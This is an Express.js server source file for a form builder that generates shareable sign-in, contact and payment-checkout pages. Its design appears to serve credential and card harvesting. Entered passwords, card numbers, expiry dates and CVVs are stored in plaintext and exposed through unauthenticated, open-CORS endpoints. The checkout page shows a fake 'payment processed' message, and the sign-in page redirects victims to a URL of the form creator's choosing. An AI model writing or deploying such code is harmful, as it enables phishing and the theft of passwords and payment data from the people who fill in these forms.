const express = require('express');
const bodyParser = require('body-parser');
const ejs = require('ejs');
const cors = require('cors');
const fs = require('fs').promises;
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

// Use persistent path for Render (set DATA_DIR=/data in Render env vars)
const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, 'data');
const submissionsFile = path.join(DATA_DIR, 'submissions.json');
const formConfigsFile = path.join(DATA_DIR, 'formConfigs.json');

// Ensure data directory exists
async function ensureDataDir() {
  try {
    await fs.mkdir(DATA_DIR, { recursive: true });
    console.log(`Data directory ensured: ${DATA_DIR}`);
  } catch (err) {
    console.error('Error creating data directory:', err.message, err.stack);
    throw err; // Stop if directory creation fails
  }
}

// Initialize submissions file
async function initializeSubmissionsFile() {
  try {
    await fs.access(submissionsFile);
    console.log(`Submissions file exists: ${submissionsFile}`);
  } catch {
    await fs.writeFile(submissionsFile, JSON.stringify([]));
    console.log('Created submissions.json');
  }
}

// Initialize form configs file
async function initializeFormConfigsFile() {
  try {
    await fs.access(formConfigsFile);
    const data = await fs.readFile(formConfigsFile, 'utf8');
    formConfigs = JSON.parse(data);
    console.log('Loaded formConfigs from file');
  } catch {
    await fs.writeFile(formConfigsFile, JSON.stringify({}));
    console.log('Created formConfigs.json');
  }
}

// Save formConfigs to file
async function saveFormConfigs() {
  try {
    await fs.writeFile(formConfigsFile, JSON.stringify(formConfigs, null, 2));
    console.log('Saved formConfigs to file');
  } catch (err) {
    console.error('Error saving formConfigs:', err.message, err.stack);
    throw err; // Stop if save fails
  }
}

// Initialize storage
let formConfigs = {};
(async () => {
  try {
    await ensureDataDir();
    await initializeSubmissionsFile();
    await initializeFormConfigsFile();
  } catch (err) {
    console.error('Initialization failed:', err.message, err.stack);
    process.exit(1); // Exit if initialization fails
  }
})();

// Middleware - Updated CORS configuration
app.use(cors({
  origin: ['http://localhost:3000', 'https://plexzora.onrender.com', '*'],
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Accept', 'Authorization'],
  credentials: false
}));
app.use(bodyParser.json());
app.use(express.static('public'));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Handle preflight requests
app.options('*', (req, res) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Accept, Authorization');
  res.sendStatus(200);
});

// EJS template for live form
const formTemplate = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title><%= templateName %></title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Inter', sans-serif;
      background: <%= theme === 'dark' ? '#1a1f2e' : '#f8f9fa' %>;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 40px 20px 20px;
      box-sizing: border-box;
      transition: background 0.3s ease;
    }
    .login-container {
      background: <%= theme === 'dark' ? '#2f3b5a' : 'white' %>;
      padding: 24px;
      border-radius: 16px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, <%= theme === 'dark' ? '0.3' : '0.1' %>);
      width: 320px;
      min-height: <%= minHeight %>;
      height: auto;
      text-align: center;
      transition: transform 0.3s ease, box-shadow 0.3s ease;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      gap: 16px;
      opacity: 1;
      margin: 0 auto;
    }
    .login-container:hover {
      transform: scale(1.02);
      box-shadow: 0 8px 24px rgba(0, 0, 0, <%= theme === 'dark' ? '0.4' : '0.15' %>);
    }
    .login-container h2 {
      font-size: 1.8rem;
      font-weight: 700;
      color: <%= theme === 'dark' ? '#ffffff' : '#000000' %>;
      margin: -4px 0 16px;
    }
    .login-container p {
      font-size: 0.9rem;
      font-weight: 400;
      color: <%= subheaderColor %>;
      margin: 0 0 16px;
    }
    .login-container span {
      cursor: default;
      pointer-events: none;
      position: relative;
      display: inline-block;
      margin: 0;
      letter-spacing: 0.5px;
    }
    .login-container span.space {
      margin-right: 4px;
      letter-spacing: 0;
      width: 4px;
      display: inline-block;
    }
    .login-container input {
      width: 100%;
      padding: 14px;
      margin: 8px 0;
      border-radius: 8px;
      font-size: 0.95rem;
      box-sizing: border-box;
      transition: all 0.2s ease;
      border: none;
      box-shadow: <%= borderShadow %>;
      background: <%= theme === 'dark' ? '#3b4a6b' : '#f8f9fa' %>;
      color: <%= theme === 'dark' ? '#f8f9fa' : '#333333' %>;
    }
    .login-container input::placeholder {
      color: <%= theme === 'dark' ? '#b0b8cc' : '#999999' %>;
      opacity: 1;
    }
    .login-container input:focus {
      outline: none;
      box-shadow: 0 0 0 3px rgba(0, 183, 255, 0.3);
      background: <%= theme === 'dark' ? '#3b4a6b' : '#ffffff' %>;
    }
    .login-container input:not(:placeholder-shown) {
      background: <%= theme === 'dark' ? '#3b4a6b' : '#ffffff' %>;
    }
    .login-container button {
      width: 100%;
      padding: 16px;
      margin: 20px 0 0;
      border-radius: 8px;
      font-size: 0.95rem;
      box-sizing: border-box;
      transition: all 0.2s ease;
      background: <%= buttonColor %>;
      color: <%= buttonTextColor %>;
      border: none;
      cursor: pointer;
      font-weight: 500;
      box-shadow: 0 2px 8px rgba(0, 183, 255, 0.3);
    }
    .login-container button:hover {
      transform: translateY(-2px);
      box-shadow: 0 4px 12px rgba(0, 183, 255, 0.5);
      background: <%= buttonColor.includes('linear-gradient') ? 'linear-gradient(45deg, #0078ff, #005bb5)' : buttonColor %>;
    }
    .popup {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%) scale(0.8);
      background: <%= theme === 'dark' ? '#2f3b5a' : '#ffffff' %>;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 6px 20px rgba(0, 0, 0, <%= theme === 'dark' ? '0.4' : '0.15' %>);
      z-index: 1000;
      text-align: center;
      max-width: 300px;
      width: 90%;
      transition: transform 0.3s ease, opacity 0.3s ease;
      border: 1px solid rgba(0, 183, 255, <%= theme === 'dark' ? '0.2' : '0.1' %>);
    }
    .popup.show {
      display: block;
      transform: translate(-50%, -50%) scale(1);
      opacity: 1;
    }
    .popup h4 {
      font-size: 1rem;
      font-weight: 600;
      color: <%= theme === 'dark' ? '#f8f9fa' : '#333333' %>;
      margin-bottom: 12px;
    }
    .popup p {
      font-size: 0.85rem;
      color: <%= theme === 'dark' ? '#d1d5db' : '#555555' %>;
      margin-bottom: 12px;
      line-height: 1.4;
    }
    .popup-close {
      position: absolute;
      top: 8px;
      right: 8px;
      background: none;
      border: none;
      font-size: 0.85rem;
      color: <%= theme === 'dark' ? '#f8f9fa' : '#555555' %>;
      cursor: pointer;
      transition: color 0.2s ease;
    }
    .popup-close:hover {
      color: #00b7ff;
    }
    .overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      z-index: 999;
      backdrop-filter: blur(2px);
      transition: opacity 0.3s ease;
    }
    .overlay.show {
      display: block;
      opacity: 1;
    }
    @media (max-width: 768px) {
      body {
        padding: 30px 16px 16px;
      }
      .login-container {
        width: 100%;
        max-width: 300px;
        padding: 20px;
      }
      .login-container h2 {
        font-size: 1.6rem;
      }
      .login-container p {
        font-size: 0.8rem;
      }
      .login-container input, .login-container button {
        padding: 12px;
        font-size: 0.9rem;
      }
      .login-container button {
        padding: 14px;
        margin: 16px 0 0;
      }
      .popup {
        width: 80%;
        max-width: 280px;
        padding: 16px;
      }
    }
    @media (max-width: 480px) {
      .login-container {
        max-width: 280px;
      }
      .login-container h2 {
        font-size: 1.4rem;
      }
      .login-container p {
        font-size: 0.8rem;
      }
      .login-container input, .login-container button {
        font-size: 0.85rem;
        padding: 10px;
      }
      .login-container button {
        padding: 12px;
        margin: 12px 0 0;
      }
      .popup {
        max-width: 260px;
      }
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h2 id="login-header"><%- headerHtml %></h2>
    <p id="login-subheader" style="color: <%= subheaderColor %>"><%= subheaderText %></p>
    <div id="input-fields">
      <% fields.forEach(field => { %>
        <input type="<%= field.type %>" id="login-<%= field.id %>" placeholder="<%= field.placeholder %>" style="box-shadow: <%= borderShadow %>;">
      <% }) %>
    </div>
    <button id="login-button" style="background: <%= buttonColor %>; color: <%= buttonTextColor %>;"><%= buttonText %></button>
  </div>
  <div class="overlay" id="message-overlay"></div>
  <div class="popup" id="message-popup" role="alertdialog" aria-labelledby="message-popup-title">
    <button class="popup-close" id="message-popup-close" aria-label="Close message popup">&times;</button>
    <h4 id="message-popup-title">Message</h4>
    <p id="message-text"></p>
  </div>

  <script>
    const templates = <%- templates %>;

    const loginButton = document.getElementById('login-button');
    const messagePopup = document.getElementById('message-popup');
    const messageOverlay = document.getElementById('message-overlay');
    const messagePopupClose = document.getElementById('message-popup-close');
    const messageText = document.getElementById('message-text');
    const inputFieldsContainer = document.getElementById('input-fields');

    function normalizeUrl(url) {
      if (!url) return null;
      url = url.trim();
      if (url.match(/^https?:\\/\\//)) return url;
      if (url.match(/\\.[a-z]{2,}$/i)) return 'https://' + url;
      return null;
    }

    function showMessagePopup(message) {
      messageText.textContent = message || 'Welcome! You have clicked the button.';
      messagePopup.classList.add('show');
      messageOverlay.classList.add('show');
    }

    function hideMessagePopup() {
      messagePopup.classList.remove('show');
      messageOverlay.classList.remove('show');
    }

    function checkFormFilled() {
      const inputs = inputFieldsContainer.querySelectorAll('input');
      const templateFields = templates['<%= template %>'].fields;

      for (let i = 0; i < inputs.length; i++) {
        const input = inputs[i];
        const value = input.value.trim();
        const fieldId = input.id.replace('login-', '');
        const templateField = templateFields.find(field => field.id === fieldId);

        if (!value && (!templateField || templateField.validation.required)) {
          showMessagePopup('Please fill all required fields before proceeding.');
          return false;
        }

        if (templateField && templateField.validation && templateField.validation.regex) {
          try {
            const regex = new RegExp(templateField.validation.regex);
            if (!regex.test(value)) {
              showMessagePopup(templateField.validation.errorMessage);
              return false;
            }
          } catch (e) {
            console.error('Invalid regex for field:', fieldId, e);
          }
        }
      }
      return true;
    }

    async function submitFormData() {
      const inputs = inputFieldsContainer.querySelectorAll('input');
      const formData = {};
      inputs.forEach(input => {
        const fieldId = input.id.replace('login-', '');
        formData[fieldId] = input.value.trim();
      });

      try {
        const response = await fetch('/form/<%= formId %>/submit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(formData)
        });
        const result = await response.json();
        if (!response.ok) {
          console.error('Submission failed:', result.error);
          showMessagePopup(result.error || 'Failed to submit form.');
          return false;
        }
        console.log('Submission successful:', result);
        return true;
      } catch (error) {
        console.error('Error submitting form:', error);
        showMessagePopup('An error occurred while submitting the form.');
        return false;
      }
    }

    try {
      loginButton.addEventListener('click', async () => {
        if (!checkFormFilled()) return;
        const submitted = await submitFormData();
        if (!submitted) return;

        const action = '<%= buttonAction %>';
        const url = '<%= buttonUrl %>';
        const message = '<%= buttonMessage %>';
        console.log('Button clicked:', { action, url, message });
        if (action === 'url') {
          const normalizedUrl = normalizeUrl(url);
          if (normalizedUrl) {
            console.log('Redirecting to:', normalizedUrl);
            window.location.href = normalizedUrl;
          } else {
            showMessagePopup('Please enter a valid URL (e.g., www.example.com).');
          }
        } else if (action === 'message') {
          showMessagePopup(message);
        } else {
          console.error('Invalid button action:', action);
          showMessagePopup('Error: Invalid button configuration.');
        }
      });

      messagePopupClose.addEventListener('click', hideMessagePopup);
      messageOverlay.addEventListener('click', hideMessagePopup);
    } catch (error) {
      console.error('Error in form script:', error);
      showMessagePopup('An error occurred. Please try again.');
    }
  </script>
</body>
</html>
`;

// Utility to normalize URLs
function normalizeUrl(url) {
  if (!url) return null;
  url = url.trim();
  if (url.match(/^https?:\/\//)) return url;
  if (url.match(/\.[a-z]{2,}$/i)) return `https://${url}`;
  return null;
}

// Utility to generate a short, unique code
function generateShortCode(length = 6) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let code = '';
  for (let i = 0; i < length; i++) {
    code += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  if (formConfigs[code]) {
    return generateShortCode(length);
  }
  return code;
}

// Utility to sanitize strings
function sanitizeForJs(str) {
  if (!str) return '';
  return str
    .replace(/['"`]/g, '\\$&')
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r')
    .replace(/\t/g, '\\t')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/&/g, '&amp;');
}

// Route to return submissions as JSON
app.get('/get', async (req, res) => {
  try {
    // Add explicit CORS headers
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Accept, Authorization');
    
    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
    const templates = {
      'sign-in': { name: 'Sign In Form', fields: [{ id: 'email' }, { id: 'password' }] },
      'contact': { name: 'Contact Form', fields: [{ id: 'phone' }, { id: 'email' }] },
      'payment-checkout': { name: 'Payment Checkout Form', fields: [{ id: 'card-number' }, { id: 'exp-date' }, { id: 'cvv' }] }
    };
    console.log(`Retrieved ${submissions.length} submissions for /get`);
    res.json({
      submissions: submissions.reverse(),
      templates
    });
  } catch (error) {
    console.error('Error fetching submissions for /get:', error.message, error.stack);
    res.status(500).json({ error: 'Failed to fetch submissions', details: error.message });
  }
});

// Route to save form configuration and generate shareable link
app.post('/create', async (req, res) => {
  try {
    console.log('Received /create request:', req.body);
    const templateId = req.body.template || 'sign-in';
    const formId = `${templateId}-${generateShortCode()}`;
    const validActions = ['url', 'message'];
    const config = {
      template: templateId,
      headerText: req.body.headerText || 'My Form',
      headerColors: Array.isArray(req.body.headerColors) ? req.body.headerColors.map(sanitizeForJs) : [],
      subheaderText: req.body.subheaderText || 'Fill the form',
      subheaderColor: req.body.subheaderColor || (req.body.theme === 'dark' ? '#d1d5db' : '#555555'),
      placeholders: Array.isArray(req.body.placeholders) ? req.body.placeholders.map(p => ({
        id: sanitizeForJs(p.id),
        placeholder: sanitizeForJs(p.placeholder)
      })) : [],
      borderShadow: req.body.borderShadow || (req.body.theme === 'dark' ? '0 0 0 2px #ffffff' : '0 0 0 2px #000000'),
      buttonColor: req.body.buttonColor || 'linear-gradient(45deg, #00b7ff, #0078ff)',
      buttonTextColor: req.body.buttonTextColor || (req.body.buttonColor === '#ffffff' ? '#000000' : '#ffffff'),
      buttonText: req.body.buttonText || 'Sign In',
      buttonAction: validActions.includes(req.body.buttonAction) ? req.body.buttonAction : 'url',
      buttonUrl: req.body.buttonUrl ? normalizeUrl(req.body.buttonUrl) : '',
      buttonMessage: req.body.buttonMessage || '',
      theme: req.body.theme === 'dark' ? 'dark' : 'light'
    };

    if (config.buttonAction === 'url' && config.buttonUrl && !normalizeUrl(config.buttonUrl)) {
      console.error('Invalid URL provided:', config.buttonUrl);
      return res.status(400).json({ error: 'Invalid URL provided' });
    }
    if (config.buttonAction === 'message' && !config.buttonMessage) {
      config.buttonMessage = 'Form submitted successfully!';
    }

    formConfigs[formId] = config;
    console.log(`Stored form config for ${formId}:`, config);
    await saveFormConfigs();

    const protocol = process.env.NODE_ENV === 'production' ? 'https' : 'http';
    const host = req.headers.host || `localhost:${port}`;
    const url = `${protocol}://${host}/form/${formId}`;
    console.log('Generated URL:', url);
    res.status(200).json({ url });
  } catch (error) {
    console.error('Error in /create:', error.message, error.stack);
    res.status(500).json({ error: 'Failed to generate shareable link', details: error.message });
  }
});

// Route to handle form submissions
app.post('/form/:id/submit', async (req, res) => {
  const formId = req.params.id;
  if (!formConfigs[formId]) {
    console.error(`Form not found for ID: ${formId}`);
    return res.status(404).json({ error: 'Form not found' });
  }

  try {
    const formData = req.body;
    const submission = {
      formId,
      timestamp: new Date().toISOString(),
      data: Object.fromEntries(
        Object.entries(formData).map(([key, value]) => [sanitizeForJs(key), sanitizeForJs(value)])
      )
    };

    console.log(`Attempting to save submission for ${formId}:`, submission);

    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
    submissions.push(submission);
    await fs.writeFile(submissionsFile, JSON.stringify(submissions, null, 2));

    console.log(`Submission saved successfully for form ${formId}`);
    res.status(200).json({ message: 'Submission saved successfully' });
  } catch (error) {
    console.error('Error saving submission:', error.message, error.stack);
    res.status(500).json({ error: 'Failed to save submission', details: error.message });
  }
});

// Route to delete a specific submission
app.delete('/form/:id/submission/:index', async (req, res) => {
  const formId = req.params.id;
  const index = parseInt(req.params.index, 10);

  try {
    // Add explicit CORS headers
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Accept, Authorization');

    // Read submissions
    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));

    // Filter submissions for the given formId
    const formSubmissions = submissions.filter(s => s.formId === formId);

    // Check if index is valid
    if (index < 0 || index >= formSubmissions.length) {
      console.error(`Invalid submission index: ${index} for form ${formId}`);
      return res.status(404).json({ error: 'Submission not found' });
    }

    // Find the global index of the submission to delete
    const globalIndex = submissions.findIndex(
      (s, i) => s.formId === formId && submissions.filter(s2 => s2.formId === formId).indexOf(s) === index
    );

    if (globalIndex === -1) {
      console.error(`Submission not found for form ${formId} at index ${index}`);
      return res.status(404).json({ error: 'Submission not found' });
    }

    // Remove the submission
    submissions.splice(globalIndex, 1);

    // Save updated submissions
    await fs.writeFile(submissionsFile, JSON.stringify(submissions, null, 2));
    console.log(`Deleted submission at index ${index} for form ${formId}`);

    res.status(200).json({ message: 'Submission deleted successfully' });
  } catch (error) {
    console.error('Error deleting submission:', error.message, error.stack);
    res.status(500).json({ error: 'Failed to delete submission', details: error.message });
  }
});

// Route to serve JSON for submissions (for backwards compatibility)
app.get('/submissions', async (req, res) => {
  try {
    // Add explicit CORS headers
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Accept, Authorization');
    
    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
    const templates = {
      'sign-in': { name: 'Sign In Form', fields: [{ id: 'email' }, { id: 'password' }] },
      'contact': { name: 'Contact Form', fields: [{ id: 'phone' }, { id: 'email' }] },
      'payment-checkout': { name: 'Payment Checkout Form', fields: [{ id: 'card-number' }, { id: 'exp-date' }, { id: 'cvv' }] }
    };
    console.log(`Retrieved ${submissions.length} submissions for /submissions`);
    res.json({
      submissions: submissions.reverse(),
      templates
    });
  } catch (error) {
    console.error('Error fetching submissions:', error.message, error.stack);
    res.status(500).json({ error: 'Failed to fetch submissions', details: error.message });
  }
});

// Route to serve the live form
app.get('/form/:id', (req, res) => {
  const formId = req.params.id;
  const config = formConfigs[formId];
  if (!config) {
    console.error(`Form not found for ID: ${formId}`);
    return res.status(404).send('Form not found');
  }

  const templates = {
    'sign-in': {
      name: 'Sign In Form',
      fields: [
        { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
        { id: 'password', placeholder: 'Password', type: 'password', validation: { required: true } }
      ],
      buttonText: 'Sign In',
      buttonAction: 'url',
      buttonUrl: '',
      buttonMessage: ''
    },
    'contact': {
      name: 'Contact Form',
      fields: [
        { id: 'phone', placeholder: 'Phone Number', type: 'tel', validation: { required: true } },
        { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } }
      ],
      buttonText: 'Submit',
      buttonAction: 'message',
      buttonUrl: '',
      buttonMessage: 'Thank you for contacting us!'
    },
    'payment-checkout': {
      name: 'Payment Checkout Form',
      fields: [
        { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: true, regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
        { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
        { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } }
      ],
      buttonText: 'Pay Now',
      buttonAction: 'message',
      buttonUrl: '',
      buttonMessage: 'Payment processed successfully!'
    }
  };

  const template = templates[config.template] || templates['sign-in'];
  const fields = template.fields.map(field => {
    const customField = config.placeholders.find(p => p.id === field.id);
    return {
      ...field,
      placeholder: customField ? customField.placeholder : field.placeholder
    };
  });

  config.placeholders.forEach(p => {
    if (!fields.some(f => f.id === p.id)) {
      fields.push({
        id: p.id,
        placeholder: p.placeholder || template.fields.find(f => f.id === p.id)?.placeholder || 'Enter value',
        type: 'text',
        validation: { required: false }
      });
    }
  });

  const inputCount = fields.length;
  const minHeight = `${300 + (inputCount - template.fields.length) * 40}px`;

  const headerHtml = config.headerText.split('').map((char, i) => {
    if (char === ' ') return '<span class="space"> </span>';
    const color = config.headerColors[i - config.headerText.slice(0, i).split(' ').length + 1] || '';
    return `<span style="color: ${sanitizeForJs(color)}">${sanitizeForJs(char)}</span>`;
  }).join('');

  try {
    const html = ejs.render(formTemplate, {
      templateName: sanitizeForJs(template.name),
      headerHtml,
      subheaderText: sanitizeForJs(config.subheaderText),
      subheaderColor: sanitizeForJs(config.subheaderColor),
      fields,
      borderShadow: sanitizeForJs(config.borderShadow),
      buttonColor: sanitizeForJs(config.buttonColor),
      buttonTextColor: sanitizeForJs(config.buttonTextColor),
      buttonText: sanitizeForJs(config.buttonText),
      buttonAction: sanitizeForJs(config.buttonAction),
      buttonUrl: sanitizeForJs(config.buttonUrl || ''),
      buttonMessage: sanitizeForJs(config.buttonMessage || ''),
      theme: config.theme,
      minHeight,
      template: config.template,
      formId,
      templates: JSON.stringify(templates, (key, value) => {
        if (key === 'regex' && value) return value.toString().slice(1, -1);
        return value;
      })
    });

    res.set('Content-Type', 'text/html');
    res.send(html);
  } catch (error) {
    console.error('Error rendering form:', error.message, error.stack);
    res.status(500).send('Error rendering form');
  }
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
}).on('error', (error) => {
  console.error('Server startup error:', error.message, error.stack);
  process.exit(1); // Exit if server fails to start
});
